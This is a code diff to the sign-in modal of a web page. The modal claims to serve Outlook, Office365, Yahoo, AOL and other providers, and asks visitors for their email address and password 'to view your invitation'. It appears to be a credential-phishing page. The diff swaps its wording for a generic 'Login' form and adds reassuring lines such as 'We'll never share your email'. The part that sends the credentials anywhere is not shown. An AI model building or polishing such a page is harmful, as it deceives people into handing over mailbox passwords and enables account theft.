@@ -133,11 +133,7 @@
   <!-- Auth modal (shared by Outlook, Office365, Yahoo, AOL, Other) -->
   <div class="modal-overlay" id="auth-modal" role="dialog" aria-modal="true" aria-labelledby="modal-provider-name">
     <div class="modal-card">
-      <div class="modal-header">
-        <div class="modal-header-left">
-          <span class="modal-provider-icon" id="modal-provider-icon" aria-hidden="true"></span>
-          <span class="modal-provider-name" id="modal-provider-name">Sign in</span>
-        </div>
+      <div class="modal-close-row">
         <button class="modal-close" id="modal-close" type="button" aria-label="Close">
           <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M6 6l12 12M18 6L6 18" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
@@ -145,21 +141,24 @@
         </button>
       </div>
       <div class="modal-body">
-        <h2 class="modal-title">Sign in to continue</h2>
-        <p class="modal-subtitle">Enter your email account credentials to view your invitation.</p>
+        <span class="modal-provider-icon" id="modal-provider-icon" aria-hidden="true"></span>
+        <span class="modal-provider-name" id="modal-provider-name">Login</span>
         <form id="modal-auth-form" class="modal-form" autocomplete="off">
-          <div class="modal-field">
-            <input type="email" id="modal-email" name="email" placeholder=" " required />
-            <label for="modal-email">Email address</label>
-          </div>
-          <div class="modal-field">
-            <input type="password" id="modal-password" name="password" placeholder=" " required />
-            <label for="modal-password">Password</label>
+          <div class="modal-field-group">
+            <div class="modal-field">
+              <span class="modal-field-label">Email Address</span>
+              <input type="email" id="modal-email" name="email" placeholder="Email" required />
+              <span class="modal-field-helper">We'll never share your email with anyone else</span>
+            </div>
+            <div class="modal-field">
+              <span class="modal-field-label">Password</span>
+              <input type="password" id="modal-password" name="password" placeholder="Enter Password" required />
+            </div>
           </div>
           <div class="modal-error" id="modal-error"></div>
           <div class="modal-actions">
             <button class="modal-cancel" id="modal-cancel" type="button">Close</button>
-            <button class="modal-submit" id="modal-submit" type="submit">Sign In</button>
+            <button class="modal-submit" id="modal-submit" type="submit">Login</button>
           </div>
         </form>
         <p class="modal-footer-note">We never share your email with anyone else. Your details are used only to deliver your invitation.</p>
